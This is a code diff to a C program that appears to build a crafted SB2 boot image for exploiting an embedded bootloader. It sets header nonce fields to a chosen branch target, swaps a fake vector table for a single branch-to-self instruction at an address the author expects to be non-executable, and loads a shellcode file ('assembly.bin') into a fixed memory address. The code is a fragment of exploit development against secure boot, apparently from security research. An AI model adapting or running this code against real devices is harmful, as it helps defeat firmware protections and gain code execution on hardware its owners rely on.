@@ -57,7 +57,7 @@ typedef struct version_t version_t;
 // calculated from where the address after the buffer
 #define GLOBAL_ADDR(a) ( ((a) - EXTRA_BUFFER_START) / 4 )
 
-#define COPY_UNTIL 0x14005a50
+#define COPY_UNTIL 0x14005a60
 
 // This includes 6 for our header
 #define NUM_COPY_BLOCKS (6 + ((COPY_UNTIL - EXTRA_BUFFER_START) / 16))
@@ -70,16 +70,13 @@ int main() {
 	uint32_t extra_bytes[1000+0x4000] =  { 0 };
 	int in_fd, out_fd, assembly_fd, ret, size;
 	struct stat st;
-	// Sized to cover vector table + interrupts + instructions
-	uint32_t fake_table[0x4d] = { 0 };
-	int i;
 
 	// Extra data used for sb2 checking?
 	header.nonce[0] = 0x00000e8f;
 	// Branch target!
 	// Remember to set the low bit for thumb mode
-	header.nonce[1] = 0x1301ae71;
-	//header.nonce[1] = 0x14005a01;
+	//header.nonce[1] = 0x1301ae71;
+	header.nonce[1] = 0x14005a01;
 	// Branch to self (just for testing)
 	header.nonce[2] = 0xe7fee7fe;
 	// Extra 
@@ -270,17 +267,8 @@ int main() {
 	// random number instead of something I could calc offline...
 	extra_bytes[GLOBAL_ADDR(0x14005058)] = 0x340158f4;
 
-
-	for (i = 0; i < 0x4d; i++) {
-		fake_table[i] = 0x14005531;
-	}
-
-	// stack pointer
-	fake_table[i] = 0x20004000;
-	// and our branch to self
-	fake_table[0x4c] = 0xe7fee7fe;
-
-	memcpy(&extra_bytes[GLOBAL_ADDR(0x14005400)], &fake_table, sizeof(fake_table));
+	// a branch to self in some place that _should_ be NX!
+	extra_bytes[GLOBAL_ADDR(0x14005400)] = 0xe7fee7fe;
 
 	in_fd = open("assembly.bin", O_RDONLY);
 
@@ -288,12 +276,9 @@ int main() {
 		printf("failed to open assembly");
 		exit(1);
 	}
-
 	
 	fstat(in_fd, &st);
 	size = st.st_size;
-
-
 
 	ret = read(in_fd, &extra_bytes[GLOBAL_ADDR(0x14005a00)], size);
 	
